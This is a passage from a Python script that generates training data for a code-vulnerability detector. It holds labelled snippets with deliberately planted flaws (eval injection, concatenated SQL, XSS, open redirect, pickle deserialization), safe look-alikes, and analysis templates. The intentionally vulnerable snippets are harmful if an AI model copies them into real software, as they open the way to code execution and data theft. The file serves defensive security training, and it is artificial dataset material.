        "5. 结论：CSRF 漏洞，注释误导不构成防御，风险 Medium。"
    ),
    cot_type="missing_control",
)

add(
    """
@app.route('/calc')
def calc():
    expr = request.args.get('expr')
    # 输入已通过严格校验
    result = eval(expr)
    return str(result)
""",
    "python", "noise_comment_validated_lie.py",
    True, "CWE-94 代码注入", "Critical",
    "request.args.get('expr')", "eval(expr)",
    "注释声称'输入已通过严格校验'，但函数体无任何校验直接 eval → 代码注入",
    "禁用 eval，改用 ast.literal_eval 或专用表达式解析",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('expr')。\n"
        "2. 危险 sink：eval(expr)。\n"
        "3. 数据流：expr 直接传入 eval，无中间校验。\n"
        "4. 防御检查：注释 # 输入已通过严格校验，但函数体 calc() 中 expr = request.args.get('expr') 之后直接 eval(expr)，"
        "没有任何 if/正则/类型检查。注释不能代替校验代码，判定基于实际控制流。\n"
        "5. 结论：eval 代码注入，注释误导不构成防御，风险 Critical。"
    ),
    cot_type="source_sink",
)

add(
    """
// 使用 PreparedStatement 防止 SQL 注入
public User findUser(String name) throws SQLException {
    String sql = "SELECT * FROM users WHERE name = '" + name + "'";
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(sql);  // 已参数化
    return rs.next() ? map(rs) : null;
}
""",
    "java", "noise_comment_param_query_lie.java",
    True, "CWE-89 SQL注入", "Critical",
    "name 参数", "stmt.executeQuery(sql)",
    "注释声称 PreparedStatement/参数化，实际用 Statement + 字符串拼接 → SQL 注入",
    "使用 PreparedStatement + setString：ps.setString(1, name)",
    analysis=(
        "分析过程：\n"
        "1. 污染源：name 参数。\n"
        "2. 危险 sink：stmt.executeQuery(sql)。\n"
        "3. 数据流：name 通过 \"SELECT * FROM users WHERE name = '\" + name + \"'\" 字符串拼接进入 sql。\n"
        "4. 防御检查：注释 // 使用 PreparedStatement / // 已参数化，但实际代码用的是 conn.createStatement()（普通 Statement）"
        "且 sql 是字符串拼接结果。PreparedStatement 必须用 prepareStatement(sql) + setString 才有参数化效果，"
        "仅写注释或仅用 executeQuery 不构成参数化。判定基于实际 API 调用。\n"
        "5. 结论：SQL 注入，注释误导不构成防御，风险 Critical。"
    ),
    cot_type="source_sink",
)

add(
    """
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    # Jinja2 自动转义已启用
    return '<h1>Hello ' + name + '</h1>'  # 手动拼接 HTML
""",
    "python", "noise_comment_safe_lie_xss.py",
    True, "CWE-79 XSS", "High",
    "request.args.get('name')", "return '<h1>Hello ' + name + '</h1>'",
    "注释声称自动转义，但手动拼接 HTML 字符串不经 Jinja2 → XSS",
    "用 render_template_string 或 markupsafe.escape(name)",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('name')。\n"
        "2. 危险 sink：return '<h1>Hello ' + name + '</h1>'（直接返回 HTML 响应）。\n"
        "3. 数据流：name 字符串拼接到 HTML 后作为响应体返回浏览器。\n"
        "4. 防御检查：注释 # Jinja2 自动转义已启用，但代码 return '<h1>Hello ' + name + '</h1>' 是 Python 字符串拼接"
        "直接返回，根本没有调用 render_template / render_template_string，Jinja2 引擎未介入，自动转义不生效。"
        "自动转义只在模板渲染时触发，手动字符串拼接不经模板引擎。\n"
        "5. 结论：反射型 XSS，注释误导不构成防御，风险 High。"
    ),
    cot_type="source_sink",
)

add(
    """
def log_access(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        app.logger.info('call %s', f.__name__)
        return f(*args, **kwargs)
    return wrapper

@app.route('/greet')
@log_access  # 装饰器仅记录日志，不改语义
def greet():
    name = request.args.get('name', '')
    return '<h1>Hi ' + name + '</h1>'
""",
    "python", "noise_decorator_xss.py",
    True, "CWE-79 XSS", "High",
    "request.args.get('name')", "return '<h1>Hi ' + name + '</h1>'",
    "log_access 装饰器仅记录日志不转义 name → XSS 仍在",
    "用 markupsafe.escape(name) 或 render_template",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('name')。\n"
        "2. 危险 sink：return '<h1>Hi ' + name + '</h1>'。\n"
        "3. 数据流：name 拼接到 HTML 返回浏览器。\n"
        "4. 防御检查：@log_access 装饰器内部仅 app.logger.info('call %s', f.__name__) 记录函数名，"
        "既不校验也不转义 name，调用 f(*args, **kwargs) 原样转发。装饰器不改变被装饰函数的安全语义。"
        "XSS 防御需要转义 name 或用模板引擎，日志装饰器与此无关。\n"
        "5. 结论：反射型 XSS，装饰器包装不构成防御，风险 High。"
    ),
    cot_type="source_sink",
)

add(
    """
@app.before_request
def before():
    app.logger.info('request: %s', request.path)

@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)
    return jsonify(cursor.fetchall())
""",
    "python", "noise_middleware_sql.py",
    True, "CWE-89 SQL注入", "Critical",
    "request.args.get('q')", "cursor.execute(query)",
    "before_request 中间件仅记录日志，search 仍字符串拼接 SQL → 注入",
    "使用参数化查询：cursor.execute(\"... LIKE %s\", (f'%{keyword}%',))",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q')。\n"
        "2. 危险 sink：cursor.execute(query)。\n"
        "3. 数据流：keyword 通过 \"... LIKE '%\" + keyword + \"%'\" 拼接进入 query。\n"
        "4. 防御检查：@app.before_request def before() 仅 app.logger.info 记录 request.path，"
        "不校验 q 也不参数化查询。before_request 钩子是请求级中间件，不改变路由函数内的 SQL 构造方式。"
        "SQL 注入防御必须在 sink 处用参数化查询。\n"
        "5. 结论：SQL 注入，中间件包装不构成防御，风险 Critical。"
    ),
    cot_type="source_sink",
)

add(
    """
def with_audit(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        audit_log(request.path)
        return f(*args, **kwargs)
    return wrapper

@app.route('/redirect')
@with_audit
def redirect_url():
    target = request.args.get('url', '/')
    return redirect(target)
""",
    "python", "noise_wrapper_redirect.py",
    True, "CWE-601 开放重定向", "Medium",
    "request.args.get('url')", "redirect(target)",
    "with_audit 装饰器仅审计日志，不校验 target → 开放重定向仍在",
    "校验 target 必须为站内相对路径或受信域名白名单",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('url')。\n"
        "2. 危险 sink：redirect(target)。\n"
        "3. 数据流：target 直接传入 redirect。\n"
        "4. 防御检查：@with_audit 装饰器内部 audit_log(request.path) 仅记录路径，"
        "不校验 target 是否站内。redirect() 收到任意 URL 都会执行 302 跳转。"
        "装饰器不改变 redirect_url 的目标校验逻辑。\n"
        "5. 结论：开放重定向，装饰器包装不构成防御，风险 Medium。"
    ),
    cot_type="source_sink",
)

add(
    """
@app.route('/greet')
def greet():
    try:
        name = request.args.get('name', '')
        return '<h1>Hi ' + name + '</h1>'
    except Exception as e:
        app.logger.error(e)
        return 'error', 500
""",
    "python", "noise_try_catch_xss.py",
    True, "CWE-79 XSS", "High",
    "request.args.get('name')", "return '<h1>Hi ' + name + '</h1>'",
    "try-catch 不转义 name → XSS 仍在；异常处理不防御注入",
    "用 markupsafe.escape(name) 或 render_template",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('name')。\n"
        "2. 危险 sink：return '<h1>Hi ' + name + '</h1>'。\n"
        "3. 数据流：name 拼接到 HTML 返回浏览器。\n"
        "4. 防御检查：try-except 包裹整个函数体，但 except 仅 app.logger.error(e) + return 'error'。"
        "字符串拼接不会抛异常（除非 OOM），正常请求不会进入 except 分支。"
        "异常处理是错误恢复机制，不做输入转义，不改变 XSS 语义。\n"
        "5. 结论：反射型 XSS，try-catch 包装不构成防御，风险 High。"
    ),
    cot_type="source_sink",
)

add(
    """
@app.route('/import')
def import_data():
    payload = request.args.get('data', '')
    try:
        obj = pickle.loads(base64.b64decode(payload))
        return jsonify(obj)
    except Exception as e:
        app.logger.warning('bad payload')
        return 'invalid', 400
""",
    "python", "noise_try_catch_deser.py",
    True, "CWE-502 反序列化", "Critical",
    "request.args.get('data')", "pickle.loads(base64.b64decode(payload))",
    "try-catch 不阻止 pickle.__reduce__ 执行 → 反序列化 RCE；异常处理在 RCE 之后才触发",
    "禁用 pickle，改用 json.loads；如必须 pickle 用 RestrictedPickler 白名单",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('data')。\n"
        "2. 危险 sink：pickle.loads(base64.b64decode(payload))。\n"
        "3. 数据流：payload → base64 解码 → pickle.loads。\n"
        "4. 防御检查：try-except 包裹，但 pickle.loads 在反序列化时会立即执行 __reduce__ 指定的代码，"
        "RCE 在 loads 返回前就发生。except 分支只能在 loads 抛异常后捕获，无法阻止已执行的恶意代码。"
        "异常处理不防御反序列化攻击。\n"
        "5. 结论：不安全反序列化（RCE），try-catch 包装不构成防御，风险 Critical。"
    ),
    cot_type="source_sink",
)

add(
    """
@app.route('/redirect')
def redirect_url():
    target = request.args.get('url', '/')
    try:
        # 看似做了校验
        if not target:
            raise ValueError('empty')
        return redirect(target)
    except ValueError:
        return 'invalid', 400
""",
    "python", "noise_try_catch_redirect.py",
    True, "CWE-601 开放重定向", "Medium",
    "request.args.get('url')", "redirect(target)",
    "try 块仅校验 target 非空，不校验是否站内 → 开放重定向；try-catch 不构成有效防御",
    "校验 target.startswith('/') and not target.startswith('//')",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('url')。\n"
        "2. 危险 sink：redirect(target)。\n"
        "3. 数据流：target 传入 redirect。\n"
        "4. 防御检查：try 块中 if not target 仅校验非空，raise ValueError 后 except 返回 400。"
        "但 target='https://evil.com' 是非空字符串，不抛异常，直接 redirect(target) 跳转外站。"
        "非空校验不等于站内校验，try-catch 结构本身不提供任何 URL 安全校验。\n"
        "5. 结论：开放重定向，try-catch 包装不构成有效防御，风险 Medium。"
    ),
    cot_type="source_sink",
)

add(
    """
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    # 看似拼接，但 %s 是占位符，参数作为元组传入 → 参数化
    query = "SELECT * FROM products WHERE name LIKE %s"
    cursor.execute(query, (f'%{keyword}%',))
    return jsonify(cursor.fetchall())
""",
    "python", "noise_safe_looks_concat_is_param.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('q')。\n"
        "2. 危险 sink：cursor.execute(query, ...)。\n"
        "3. 数据流：keyword 进入 f'%{keyword}%' 作为元组元素传给 execute 的第二个参数。\n"
        "4. 防御检查：query = \"SELECT * FROM products WHERE name LIKE %s\" 中 %s 是参数占位符，"
        "不是 Python % 格式化（没有 % keyword 操作）。cursor.execute(query, (f'%{keyword}%',)) 把 f-string "
        "构造的搜索串作为参数值传递，由驱动做转义。看似 f-string 拼接 f'%{keyword}%' 容易误判，"
        "但这里 f-string 只构造 LIKE 的参数值（含 % 通配符），SQL 主体与参数分离，是合法的参数化查询。\n"
        "5. 结论：参数化查询，未发现漏洞。"
    ),
)

add(
    """
@app.route('/parse')
def parse_data():
    raw = request.args.get('data', '{}')
    # 形似 eval，实为 json.loads（仅解析字面量）
    obj = eval_json(raw)
    return jsonify(obj)

def eval_json(s):
    import json
    return json.loads(s)
""",
    "python", "noise_safe_looks_eval_is_json.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('data')。\n"
        "2. 危险 sink：eval_json(raw) → 内部 json.loads(s)。\n"
        "3. 数据流：raw 传入 eval_json，函数体 return json.loads(s)。\n"
        "4. 防御检查：虽然函数名 eval_json 含 eval 字样、调用处 obj = eval_json(raw) 形似 eval，"
        "但实际函数体 import json; return json.loads(s)，json.loads 只解析 JSON 字面量，不执行任意表达式。"
        "命名误导不改变实际实现，判定基于 eval_json 的函数体。\n"
        "5. 结论：json.loads 仅解析字面量，未发现代码注入。"
    ),
)

add(
    """
@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    # 看似 os.system 拼接，实为 subprocess 列表
    args = ['ping', '-c', '1', host]
    result = subprocess.run(args, capture_output=True, text=True)
    return result.stdout
""",
    "python", "noise_safe_looks_shell_is_list.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('host')。\n"
        "2. 危险 sink：subprocess.run(args, ...)。\n"
        "3. 数据流：host 作为 args 列表的最后一个元素传入。\n"
        "4. 防御检查：args = ['ping', '-c', '1', host] 是列表形式，subprocess.run(args) 未传 shell=True（默认 False）。"
        "列表参数下每个元素作为独立 argv 传递，shell 元字符（; | & $）被当作普通字符，不会触发 shell 解析。"
        "虽然 host 未经白名单校验（建议补充），但本条不存在命令注入。"
        "看似 host 直接进入命令构造，但参数化列表模式有效防御了 shell 注入。\n"
        "5. 结论：列表参数 + shell=False，未发现命令注入。"
    ),
)

add(
    """
@app.route('/import')
def import_data():
    payload = request.args.get('data', '')
    # 看似 pickle.loads，实为 json.loads
    obj = loads(payload)
    return jsonify(obj)

def loads(s):
    import json
    return json.loads(s)
""",
    "python", "noise_safe_looks_pickle_is_json.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：request.args.get('data')。\n"
        "2. 危险 sink：loads(payload) → 内部 json.loads(s)。\n"
        "3. 数据流：payload 传入 loads，函数体 return json.loads(s)。\n"
        "4. 防御检查：调用处 obj = loads(payload) 形似 pickle.loads，但 loads 函数体实际是 json.loads(s)。"
        "json.loads 只解析 JSON 字面量，不执行 __reduce__，不存在反序列化 RCE。"
        "命名误导（loads 容易联想 pickle.loads）不改变实际实现。\n"
        "5. 结论：json.loads 仅解析字面量，未发现反序列化漏洞。"
    ),
)

add(
    """
<?php
// 看似拼接 SQL，实为 prepared statement 占位符
$name = $_GET['name'] ?? '';
$sql = "SELECT * FROM users WHERE name = ?";  // ? 是占位符，非拼接
$stmt = $pdo->prepare($sql);
$stmt->execute([$name]);
$row = $stmt->fetch();
echo json_encode($row);
""",
    "php", "noise_safe_php_looks_concat.php",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
    analysis=(
        "分析过程：\n"
        "1. 污染源：$_GET['name']。\n"
        "2. 危险 sink：$stmt->execute([$name])。\n"
        "3. 数据流：$name 作为数组元素传给 execute。\n"
        "4. 防御检查：$sql = \"SELECT * FROM users WHERE name = ?\" 中 ? 是 PDO 占位符，"
        "$pdo->prepare($sql) 预编译语句，$stmt->execute([$name]) 把 $name 作为参数绑定。"
        "看似 $name 直接出现在 SQL 上下文，但实际通过占位符 + prepare/execute 参数化，"
        "驱动负责转义。命中参数化查询安全模式。\n"
        "5. 结论：PDO prepared statement，未发现 SQL 注入。"
    ),
)


# ===========================================================================
# 构建逻辑
# ===========================================================================

def build_analysis(sample: dict) -> str:
    """根据样本字段与 cot_type 生成 CoT 分析（若 sample 自带 analysis 则优先用）。

    P0 改造：支持 missing_control / hardcoded_secret / integer_overflow /
    crypto_weakness / info_disclosure / race_condition 等非 source-sink 类的 CoT 模板，
    避免所有样本都用同一个 source-sink 模板导致模型只会模板化模式匹配。
    """
    if sample.get("analysis"):
        return sample["analysis"]

    cot_type = sample.get("cot_type") or "source_sink"
    is_vuln = sample["has_vulnerability"]

    # ---- 安全样本：根据样本自带 analysis 或 taint_path 生成具体说明 ----
    # 不再用统一模板，避免模型学会"无脑判安全"的退化策略
    if not is_vuln:
        sink = sample.get('sink', 'N/A')
        taint_path = sample.get('taint_path', 'N/A')
        # 每条安全样本的 analysis 必须描述具体的防御措施
        return (
            "分析过程：\n"
            f"1. 输入检查：识别代码中的用户输入点与处理逻辑。\n"
            f"2. sink 评估：{sink}，需判断此处是否有有效防护。\n"
            f"3. 防御确认：{taint_path}。\n"
            f"4. 综合判定：该防护措施有效，不存在可利用的安全漏洞。\n"
            f"5. 结论：代码安全，未发现漏洞。"
        )

    # ---- 漏洞样本：按 cot_type 选模板 ----
    vt = sample["vulnerability_type"]
    rl = sample["risk_level"]

    if cot_type == "missing_control":
        # CSRF / 缺失认证 / 缺失授权 / IDOR / 会话固定 / 批量赋值
        # 这类漏洞不是"用户输入到达 sink"，而是"缺少某个安全控制点"
        return (
            "分析过程：\n"
            f"1. 控制点检查：识别该操作应具备的安全控制（{sample.get('source', '认证/授权/CSRF token')}）。\n"
            f"2. 控制是否缺失：代码中{sample.get('taint_path', '未找到对应的安全控制')}，"
            "该操作在无防护下直接执行。\n"
            f"3. 攻击面：{sample.get('sink', '攻击者可绕过该控制点')}，"
            "由于缺少控制，攻击者可直接触发敏感操作。\n"
            "4. 防御检查：未发现 token 校验 / 装饰器 / 归属校验 / 控制点存在性检查等任一有效防护。\n"
            f"5. 结论：存在 {vt}（缺失安全控制），风险等级 {rl}。"
            "注意：此类漏洞不是输入到 sink 的注入，而是缺少必要的安全控制点。"
        )

    if cot_type == "hardcoded_secret":
        return (
            "分析过程：\n"
            f"1. 凭证位置：检查源码中是否出现凭证字面量。{sample.get('source', '源码字面量')}。\n"
            "2. 是否字面量：变量名含 key/secret/password/token 且赋值为字符串字面量，"
            "符合硬编码凭证特征。\n"
            "3. 是否从环境读取：代码未通过 os.environ / 配置文件 / KMS 读取，而是直接写死在源码中。\n"
            f"4. 影响范围：{sample.get('taint_path', '凭证会随源码进入版本库/构建产物')}，"
            "任何能看到源码的人都能获取凭证。\n"
            f"5. 结论：存在 {vt}，风险等级 {rl}。硬编码凭证本身就是漏洞，无需其他攻击向量。"
        )

    if cot_type == "integer_overflow":
        return (
            "分析过程：\n"
            f"1. 运算识别：{sample.get('source', '输入参数')} 参与{sample.get('sink', '算术运算')}。\n"
            "2. 范围检查：代码未对运算结果做溢出检查（无 __builtin_*_overflow / 无大整数库 / 无范围断言）。\n"
            f"3. 溢出可能：{sample.get('taint_path', '当输入超出预期范围时，运算结果溢出')}，"
            "可能产生负数或回绕值。\n"
            "4. 后果：溢出结果可绕过后续校验（如金额、长度、索引），导致逻辑错误或内存越界。\n"
            f"5. 结论：存在 {vt}，风险等级 {rl}。"
        )

    if cot_type == "crypto_weakness":
        return (
            "分析过程：\n"
            f"1. 算法/参数识别：{sample.get('sink', '使用的加密算法/参数')}。\n"
            f"2. 强度评估：{sample.get('taint_path', '该算法/参数已被认为不安全')}，"
            "存在已知弱点（碰撞/可预测/短密钥/固定 IV）。\n"
            "3. 已知攻击：MD5 碰撞、random 可预测、固定 IV 相同明文产生相同密文等。\n"
            "4. 防御检查：未使用安全替代（bcrypt/argon2/secrets/token_hex/随机 IV）。\n"
            f"5. 结论：存在 {vt}，风险等级 {rl}。"
        )

    if cot_type == "info_disclosure":
        return (
            "分析过程：\n"
            f"1. 泄露内容：{sample.get('source', '返回给用户的信息')}。\n"
            f"2. 接收方：{sample.get('sink', 'HTTP 响应/日志/错误页面')}。\n"
            f"3. 是否敏感：{sample.get('taint_path', '该信息含文件路径/库版本/堆栈/用户存在性等')}，"
            "对攻击者有利用价值。\n"
            "4. 防御检查：未做信息过滤，直接返回原始内容给用户。\n"
            f"5. 结论：存在 {vt}，风险等级 {rl}。"
        )

    if cot_type == "race_condition":
        return (
            "分析过程：\n"
            f"1. 共享状态：{sample.get('source', '共享变量/资源')} 被并发访问。\n"
            f"2. 同步机制：{sample.get('sink', 'check-then-use 模式')}，代码未加锁/未用原子操作。\n"
            f"3. 时间窗口：{sample.get('taint_path', '检查与使用之间存在时间窗口')}，"
            "并发请求可在窗口内改变状态。\n"
            "4. 防御检查：未发现 threading.Lock / 事务 / 原子操作 等同步机制。\n"
            f"5. 结论：存在 {vt}，风险等级 {rl}。"
        )

    # 默认：source_sink 模板（注入类）
    return (
        "分析过程：\n"
        f"1. 污染源：{sample['source']}。\n"
        f"2. 危险 sink：{sample['sink']}。\n"
        f"3. 数据流：{sample['taint_path']}。\n"
        "4. 防御检查：代码中无有效防御措施（无参数化、无转义、无校验）。\n"
        f"5. 结论：存在 {sample['vulnerability_type']}，风险等级 {sample['risk_level']}。"
    )


def build_json_verdict(sample: dict) -> str:
    """根据样本字段构造 JSON 结论块。"""
    verdict = {
        "has_vulnerability": sample["has_vulnerability"],
        "vulnerability_type": sample["vulnerability_type"],
        "risk_level": sample["risk_level"],
        "source": sample["source"],
        "sink": sample["sink"],
        "explanation": sample["taint_path"] if sample["has_vulnerability"]
                       else (sample.get("taint_path", "") or "代码中未发现可利用的安全漏洞。"),
        "fix_suggestion": sample["fix_idea"],
    }
    return "```json\n" + json.dumps(verdict, ensure_ascii=False, indent=2) + "\n```"


def build_messages(sample: dict) -> dict:
    """把样本转为 ChatML 消息结构。"""
    analysis = build_analysis(sample)
    json_block = build_json_verdict(sample)
    assistant_content = f"{analysis}\n\n{json_block}"
    user_content = build_user_prompt(
        code=sample["code"],
        language=sample["language"],
        filename=sample["filename"],
    )
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ]
    }


def main():
    os.makedirs(SAMPLES_DIR, exist_ok=True)
    print(f"共 {len(SAMPLES)} 条样本")
    vuln = sum(1 for s in SAMPLES if s["has_vulnerability"])
    safe = len(SAMPLES) - vuln
    print(f"  漏洞样本: {vuln}  安全样本: {safe}")
    cwes = set()
    for s in SAMPLES:
        if s["has_vulnerability"] and s["vulnerability_type"] != "none":
            cwe = s["vulnerability_type"].split()[0]
            cwes.add(cwe)
    print(f"  覆盖 CWE: {len(cwes)} 种")
    print(f"  CWE 列表: {sorted(cwes)}")

    # 语言分布
    langs = {}
    for s in SAMPLES:
        langs[s["language"]] = langs.get(s["language"], 0) + 1
    print(f"  语言分布: {langs}")

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for sample in SAMPLES:
            record = build_messages(sample)
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
    print(f"\n已写入: {OUTPUT_FILE}")

    # 统计平均 token 长度（粗略估计：4 字符 ≈ 1 token）
    total_chars = 0
    for sample in SAMPLES:
        record = build_messages(sample)
        for msg in record["messages"]:
            total_chars += len(msg["content"])
    print(f"  总字符数: {total_chars}  估计 token: ~{total_chars // 4}")


if __name__ == "__main__":
    main()
